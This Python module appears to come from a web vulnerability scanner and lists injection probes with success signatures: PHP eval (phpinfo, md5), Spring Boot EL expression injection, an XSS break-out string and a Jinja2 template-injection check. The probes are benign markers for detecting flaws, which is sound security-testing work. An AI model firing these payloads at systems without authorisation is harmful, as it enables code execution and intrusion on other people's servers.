#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from utils import Random, Hash

phpinfo_sign = '<a href="http://www.php.net/">'
xss_payload = xss_sign = '\'";abcdefg123456'

el_sign = Random.id_generator(size=10)
el_payload = ','.join(str(ord(i)) for i in el_sign)

el_sign2 = '119841162-2'
el2_payload = el_sign2


# Command Execute Payloads
payloads = [
    {
        'name': 'PHP Code eval',
        'payload': 'phpinfo();',
        'sign': phpinfo_sign

    }, {
        'name': 'PHP Code eval',
        'payload': '${print_r(md5(11123))};',
        'sign': Hash.md5('11123')

    }, {
        'name': 'Sprint Boot EL',
        'payload': '${{new java.lang.String(new byte[]{{{0}}})}}'.format(
            el_payload),
        'sign': el_sign,
    }, {
        'name': 'Sprint Boot EL',
        'payload': '${{{0}}}'.format(el2_payload),
        'sign': str(eval(el_sign2))
    }, {
        'name': 'XSS',
        'payload': xss_payload,
        'sign': xss_sign
    }, {
        'name': 'Jinja2 STI',
        'payload': '{{ 111121 + 2229223 }}',
        'sign': '2340344'
    }

]
